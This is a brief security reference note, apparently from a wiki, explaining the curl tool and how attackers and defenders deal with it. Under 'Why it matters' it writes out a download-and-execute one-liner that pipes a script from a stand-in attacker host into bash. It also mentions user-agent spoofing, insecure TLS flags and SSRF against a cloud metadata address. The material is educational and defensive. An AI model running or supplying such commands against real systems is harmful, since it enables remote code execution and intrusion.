# curl

## What it is
Like a postal worker who can fetch any package from any address and hand it directly to you on the command line, `curl` is a command-line tool and library for transferring data using URLs across dozens of protocols (HTTP, HTTPS, FTP, SFTP, and more). It speaks raw protocol, letting you craft and inspect network requests with surgical precision.

## Why it matters
Attackers use `curl` as a one-liner delivery mechanism during post-exploitation — for example, `curl http://attacker.com/shell.sh | bash` downloads and executes a malicious payload entirely in memory, bypassing file-based AV detection. Defenders monitor proxy and endpoint logs for `curl` user-agent strings combined with unusual outbound destinations as an indicator of compromise during lateral movement or C2 beaconing.

## Key facts
- `curl` supports over 25 protocols, making it a versatile exfiltration and staging tool; blocking it on endpoints is a common hardening step
- The `-k` / `--insecure` flag disables SSL/TLS certificate verification, a red flag in logs indicating potential MITM acceptance or self-signed C2 infrastructure
- `curl` sends a recognizable `User-Agent: curl/version` header by default; attackers often spoof this with `-A` to blend into browser traffic
- Used extensively in Server-Side Request Forgery (SSRF) exploitation, where a vulnerable web app is tricked into making `curl`-like requests to internal services (e.g., AWS metadata endpoint `169.254.169.254`)
- In CTF and pentesting workflows, `curl -v` reveals raw HTTP headers and TLS handshake details useful for fingerprinting and vulnerability identification

## Related concepts
[[Server-Side Request Forgery (SSRF)]] [[Command and Control (C2)]] [[TLS Certificate Validation]] [[User-Agent Spoofing]] [[Living Off the Land Binaries (LOLBins)]]